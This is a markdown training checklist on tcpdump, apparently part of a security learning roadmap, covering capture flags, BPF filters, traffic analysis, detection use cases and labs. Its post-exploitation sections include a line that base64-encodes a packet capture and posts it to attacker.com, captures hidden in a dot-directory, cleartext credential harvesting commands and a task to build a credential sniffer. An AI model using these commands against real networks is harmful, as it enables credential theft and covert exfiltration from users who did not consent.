# 🦈 tcpdump: Complete Mastery Checklist

> **What is tcpdump?** tcpdump is a command-line packet capture and analysis tool. It captures network packets from a specified interface — applying optional BPF (Berkeley Packet Filter) expressions to filter what gets captured — and displays or saves them. It is the standard tool for command-line packet capture on Linux/Unix systems, deployable on any machine without a GUI.
>
> **Why does it exist?** Wireshark is excellent for interactive analysis but requires a GUI and is not available on headless servers. tcpdump runs everywhere, captures to `.pcap` files for later Wireshark analysis, and can filter, display, and analyze packets directly in the terminal. It is indispensable for troubleshooting, traffic analysis, and network-level security investigation on servers.
>
> **When to use it:** Capturing traffic on a remote server or compromised host (no GUI available). Creating `.pcap` files for later Wireshark analysis. Quick protocol-level debugging (is this traffic reaching the server?). Network forensics and incident response. Post-exploitation traffic analysis on compromised hosts.
>
> **When to use Wireshark instead:** When you need full interactive protocol analysis. When you need to follow TCP streams visually. When working on a desktop with GUI access and large captures.
>
> **What mastering tcpdump unlocks:** Network traffic analysis capability in any environment. Evidence collection from servers. Protocol-level debugging. Foundation for understanding all network-based attacks and defenses.
>
> **Roadmap Phase:** Phase 2–7 (Scanning through DFIR — CLI packet capture used across all phases)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | BPF Filters | 5 | 3–4 hours |
| 3 | Capture Options | 4 | 2–3 hours |
| 4 | Analysis | 4 | 2–3 hours |
| 5 | Security Use Cases | 4 | 2–3 hours |
| 6 | Integration | 3 | 1–2 hours |
| 7 | Practical Labs | 4 | 3–5 hours |
| 8 | Mastery Challenges | 3 | 2–4 hours |
| | **Total** | **32** | **~17–27 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — What tcpdump Captures

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Layer 2+** | Captures Ethernet frames, IP packets, TCP/UDP/ICMP segments — the complete packet. |
| **Promiscuous Mode** | By default, captures only traffic to/from the host. `-p` disables promiscuous mode. Without `-p`: captures all traffic on the segment (if the NIC/driver supports it). |
| **Interface** | Must specify with `-i`. `-i any` — capture on all interfaces simultaneously. |
| **Permissions** | Requires root or `CAP_NET_RAW` capability. `sudo tcpdump`. |

---

### Task 1.2 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Linux** | `apt install tcpdump`. Pre-installed on most distributions. |
| **macOS** | Built-in. |
| **Verify** | `tcpdump --version`. |

---

### Task 1.3 — Basic Capture

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **All traffic** | `sudo tcpdump -i eth0`. Ctrl+C to stop. |
| **Count** | `-c 100` — capture 100 packets then stop. |
| **Verbose** | `-v` — verbose (TTL, id, length). `-vv` — more verbose. `-vvv` — maximum verbosity. |
| **No DNS** | `-n` — don't resolve hostnames (faster, shows IPs). `-nn` — don't resolve hostnames or port names. |

---

### Task 1.4 — Essential Flags

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Interface** | `-i eth0`. `-i any` — all interfaces. |
| **Write to file** | `-w capture.pcap` — save raw packets for Wireshark. |
| **Read from file** | `-r capture.pcap` — analyze saved capture. |
| **Hex+ASCII** | `-X` — show packet contents in hex and ASCII. `-XX` — include Ethernet header. |
| **Timestamp** | `-tttt` — show human-readable timestamps. |
| **Snaplen** | `-s 0` — capture full packets (default was 68 bytes historically; modern default is 262144). Always use `-s 0` to ensure full packet capture. |

---

### Task 1.5 — Output Format

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Default** | `HH:MM:SS.usec SRC > DST: proto, flags, seq, ack, win, length`. |
| **Example TCP** | `10:15:23.123456 IP 192.168.1.5.54321 > 93.184.216.34.80: Flags [S], seq 123456789, win 64240, length 0`. |
| **Flags** | `[S]`=SYN, `[.]`=ACK, `[SA]`=SYN-ACK, `[P.]`=PSH-ACK, `[F.]`=FIN-ACK, `[R.]`=RST-ACK. |

---

# PHASE 2: BPF FILTERS

---

### Task 2.1 — Host Filters

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Single Host** | `tcpdump -i eth0 host 192.168.1.100` — traffic to or from this IP. |
| **Source** | `tcpdump -i eth0 src host 192.168.1.100` — only FROM this IP. |
| **Destination** | `tcpdump -i eth0 dst host 192.168.1.100` — only TO this IP. |
| **Network** | `tcpdump -i eth0 net 192.168.1.0/24` — all traffic in this subnet. |

---

### Task 2.2 — Port Filters

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Single Port** | `tcpdump -i eth0 port 80` — HTTP traffic. |
| **Port Range** | `tcpdump -i eth0 portrange 1-1024`. |
| **Src/Dst Port** | `tcpdump -i eth0 src port 80` — responses FROM port 80. `tcpdump -i eth0 dst port 443` — requests TO port 443. |
| **Multiple Ports** | `tcpdump -i eth0 port 80 or port 443`. |

---

### Task 2.3 — Protocol Filters

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **TCP** | `tcpdump -i eth0 tcp`. |
| **UDP** | `tcpdump -i eth0 udp`. |
| **ICMP** | `tcpdump -i eth0 icmp` — ping traffic. |
| **ARP** | `tcpdump -i eth0 arp` — ARP traffic (useful for ARP poisoning detection). |
| **DNS** | `tcpdump -i eth0 port 53` — DNS queries/responses. |

---

### Task 2.4 — Combining Filters with Logic

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **AND** | `tcpdump -i eth0 host 192.168.1.5 and port 443`. |
| **OR** | `tcpdump -i eth0 port 80 or port 443`. |
| **NOT** | `tcpdump -i eth0 not port 22` — exclude SSH (reduces noise when connected via SSH). |
| **Complex** | `tcpdump -i eth0 "tcp and (port 80 or port 443) and src host 192.168.1.5"`. Use quotes for complex expressions with parentheses. |

---

### Task 2.5 — TCP Flag Filters

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **SYN packets** | `tcpdump -i eth0 "tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0"` — SYN without ACK (new connections only). |
| **RST packets** | `tcpdump -i eth0 "tcp[tcpflags] & tcp-rst != 0"` — connection resets. |
| **SYN flood detection** | High rate of SYN packets. `tcpdump -i eth0 'tcp[tcpflags] == tcp-syn'` — shows only pure SYN packets. |

---

# PHASE 3: CAPTURE OPTIONS

---

### Task 3.1 — Writing and Reading PCAP Files

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Capture** | `sudo tcpdump -i eth0 -w /tmp/capture.pcap -s 0`. |
| **Analyze** | `tcpdump -r capture.pcap -nn -v`. Apply the same BPF filters when reading: `tcpdump -r capture.pcap port 80`. |
| **Open in Wireshark** | Transfer `.pcap` file to a desktop machine → open with Wireshark for full GUI analysis. |

---

### Task 3.2 — Rotating Capture Files

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **By Size** | `-C 100` — rotate to a new file every 100MB. Files named: `capture.pcap0`, `capture.pcap1`, etc. |
| **By Time** | `-G 3600` — rotate every 3600 seconds (1 hour). Use with `-w capture_%Y%m%d%H%M%S.pcap` (strftime format). |
| **Keep N files** | `-W 10` — keep only 10 files (ring buffer). Oldest deleted as new is created. |
| **Long-term Capture** | `tcpdump -i eth0 -w capture_%H%M%S.pcap -G 3600 -W 24 -s 0` — 24 rotating hourly files (24-hour ring buffer). |

---

### Task 3.3 — Capture Buffer

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Drop Count** | tcpdump shows dropped packet count at exit: `X packets received, Y dropped`. Drops = kernel buffer full. |
| **Increase Buffer** | `-B 4096` — set kernel buffer to 4096KB. Useful for high-traffic captures. |

---

### Task 3.4 — ASCII Content Display

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Hex+ASCII** | `tcpdump -i eth0 -X port 80` — shows hex and ASCII side by side. Good for seeing unencrypted HTTP content. |
| **ASCII only** | `tcpdump -i eth0 -A port 80` — shows ASCII only. Easier to read for HTTP. |
| **Credentials** | On an HTTP or Telnet connection: `-A` shows credentials in cleartext (login forms, basic auth, etc.). |

---

# PHASE 4: ANALYSIS

---

### Task 4.1 — Protocol Analysis

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **HTTP** | `tcpdump -i eth0 -A port 80 | grep -i "GET\|POST\|Host:\|password"`. Extract URLs, host headers, form data. |
| **DNS** | `tcpdump -i eth0 udp port 53 -nn -vv`. See query names and responses. Find suspicious DNS lookups (exfiltration, C2 beaconing). |
| **FTP** | `tcpdump -i eth0 -A port 21`. Capture FTP credentials (cleartext). |
| **Telnet** | `tcpdump -i eth0 -A port 23`. Capture Telnet session (cleartext). |

---

### Task 4.2 — Connection Tracking

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **New Connections** | `tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' -nn` — see every new TCP connection attempt. |
| **Failed Connections** | `tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0' -nn` — see RST packets (connection refused or terminated). |
| **Count Connections** | `tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' -nn | awk '{print $5}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head`. Top source IPs by new connection rate. |

---

### Task 4.3 — Extracting Files from PCAP

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **tcpflow** | `tcpflow -r capture.pcap -C -g` — reconstruct TCP streams from pcap. |
| **Wireshark** | Open pcap → Follow TCP/HTTP stream → Export HTTP objects (File → Export Objects → HTTP). |
| **networkminer** | GUI tool on Windows for file extraction from pcap. |
| **dsniff** | `dsniff -p capture.pcap` — extract credentials from captured pcap. |

---

### Task 4.4 — Detecting Anomalies

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **ARP Spoofing** | `tcpdump -i eth0 arp` — look for one MAC address claiming multiple IPs, or IP address changing MAC. `arp -a` before/after for comparison. |
| **Port Scan** | Many SYN packets from one source to many different ports in quick succession. |
| **Data Exfiltration** | Unusually high outbound traffic volume. Large DNS query payloads (DNS tunneling). ICMP packets with large payloads. |
| **C2 Beaconing** | Regular interval connections to the same external IP. Look for traffic with consistent timing. |

---

# PHASE 5: SECURITY USE CASES

---

### Task 5.1 — Credential Capture on Cleartext Protocols

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **HTTP Basic Auth** | `tcpdump -i eth0 -A port 80 | grep -i "Authorization: Basic"`. Decode base64: `echo "dXNlcjpwYXNz" | base64 -d`. |
| **FTP** | `tcpdump -i eth0 -A port 21 | grep -i "user\|pass"`. |
| **Telnet** | `tcpdump -i eth0 -A port 23` — every keystroke visible. |
| **SNMP** | `tcpdump -i eth0 -A port 161` — community strings (v1/v2c: cleartext). |

---

### Task 5.2 — C2 Traffic Identification

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Beaconing** | `tcpdump -i eth0 -w beacon.pcap dst host suspicious_ip` → analyze in Wireshark. Look for regular interval connections. |
| **DNS C2** | `tcpdump -i eth0 udp port 53 -nn -A` — long DNS query strings, unusual record types (TXT, NULL), high query frequency to a single domain. |
| **HTTP C2** | `tcpdump -i eth0 -A port 80 | grep "User-Agent\|Host:"` — unusual User-Agents, beaconing to uncommon domains. |

---

### Task 5.3 — Post-Exploitation on Compromised Host

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Capture Credentials** | On a compromised host: `tcpdump -i any -A port 80 or port 21 or port 110 -w /tmp/creds.pcap`. Capture traffic from other clients on the network segment. |
| **Exfiltrate PCAP** | Transfer pcap from compromised host to attack machine for offline analysis. `scp`, `nc`, base64+paste. |

---

### Task 5.4 — Traffic Baseline

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Capture "normal" traffic to understand what baseline looks like. Anomalies stand out against a known baseline. |
| **Method** | Capture 30 min of normal traffic. Note: top talkers, common ports, common protocols, average packet sizes. Compare against future captures for deviation. |

---

# PHASE 6: INTEGRATION

---

### Task 6.1 — tcpdump + Wireshark

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Workflow** | Capture on remote server: `sudo tcpdump -i eth0 -s 0 -w /tmp/capture.pcap`. SCP to local: `scp user@server:/tmp/capture.pcap .`. Open in Wireshark. |
| **Live Pipe** | `ssh user@server "sudo tcpdump -i eth0 -s 0 -w -" | wireshark -k -i -` — live remote capture in local Wireshark. |

---

### Task 6.2 — tcpdump + tshark

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **tshark** | CLI version of Wireshark. Much more powerful analysis than tcpdump for reading pcap. `tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri`. |
| **Protocol Statistics** | `tshark -r capture.pcap -qz io,phs` — protocol hierarchy statistics. |

---

### Task 6.3 — tcpdump on Compromised Hosts

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Deploy** | After compromising a Linux host: check if tcpdump is installed (`which tcpdump`). If root: run directly. If not installed: upload static binary. |
| **Capture** | `tcpdump -i any -s 0 -w /tmp/.hidden/capture.pcap` (hidden directory). |
| **Transfer** | `base64 /tmp/capture.pcap | curl -X POST http://attacker.com/ -d @-` or SCP. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — Basic Capture and Filter

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| **Scenario** | Capture HTTP traffic on your lab network. Filter to show only requests to a specific web server. Extract the Host headers and URLs from the capture. |
| **Success Criteria** | Traffic captured. BPF filter applied. Host headers and URLs visible in `-A` output. |

---

### Lab 7.2 — PCAP Analysis

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| **Scenario** | Download a challenge pcap from Wireshark Sample Captures or a CTF. Analyze with tcpdump (no Wireshark allowed). Find: all unique source IPs, all unique destination ports, any cleartext credentials. |
| **Success Criteria** | All findings documented using only tcpdump commands. |

---

### Lab 7.3 — C2 Beaconing Detection

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | Run a Metasploit or Sliver C2 implant in your lab. Capture traffic with tcpdump. Identify the C2 traffic from the capture using BPF filters and `-A` output analysis. Document the traffic signature. |
| **Success Criteria** | C2 traffic identified. Timing interval measured. Traffic signature documented. |

---

### Lab 7.4 — Remote Server Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | SSH to a remote Linux VM in your lab. Run tcpdump remotely to capture HTTP traffic. Pipe the capture directly to Wireshark on your local machine in real time. Analyze the live traffic in Wireshark. |
| **Success Criteria** | Live remote capture piped to local Wireshark. HTTP traffic visible. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — CTF Network Forensics

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Find a CTF challenge involving network forensics (PCAP-based). Solve it using only tcpdump and CLI tools (grep, awk, strings). No Wireshark GUI. Extract the flag from the PCAP. |
| **Success Criteria** | Flag extracted using only CLI tools. Methodology documented. |

---

### Challenge 8.2 — Build a Credential Sniffer

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Write a bash/Python script that runs tcpdump, captures cleartext credentials from FTP/HTTP/Telnet, and logs username:password pairs to a file in real time. |
| **Success Criteria** | Script functional. Correctly captures credentials from at least 2 protocols. |

---

### Challenge 8.3 — Incident Response via PCAP

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Download a malware infection pcap (Malware Traffic Analysis — malware-traffic-analysis.net). Using only tcpdump and CLI tools: identify the infected host, the C2 server, the malware family signatures, all IOCs in the traffic. Write an incident response report. |
| **Success Criteria** | All IOCs identified. Malware family confirmed. Incident response report written. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can capture live traffic on a specified interface | ☐ |
| Can write and read PCAP files | ☐ |
| Can write complex BPF filter expressions | ☐ |
| Can filter by host, port, protocol, and TCP flags | ☐ |
| Can extract cleartext credentials from captured traffic | ☐ |
| Can detect ARP spoofing, port scans, and C2 beaconing | ☐ |
| Can pipe remote tcpdump to local Wireshark in real time | ☐ |
| Can use tcpdump on compromised hosts for lateral traffic capture | ☐ |
| Can analyze a PCAP file for incident response | ☐ |
| Knows when to use tcpdump vs. Wireshark vs. tshark | ☐ |

---

## 🎯 Interview Questions

1. What is a BPF filter and how do you use it in tcpdump?
2. How do you capture only SYN packets (new connections) with tcpdump?
3. How do you detect ARP poisoning using tcpdump?
4. How do you extract cleartext HTTP credentials from a tcpdump capture?
5. How do you pipe remote tcpdump output to local Wireshark in real time?
6. What does the `-s 0` flag do and why is it important?
7. How do you create a rotating capture that keeps only the last 24 hours of traffic?
8. How would you use tcpdump on a compromised Linux host to capture lateral traffic?
9. What are the signs of DNS tunneling in a tcpdump capture?
10. How do you filter for traffic from a specific host to a specific port?
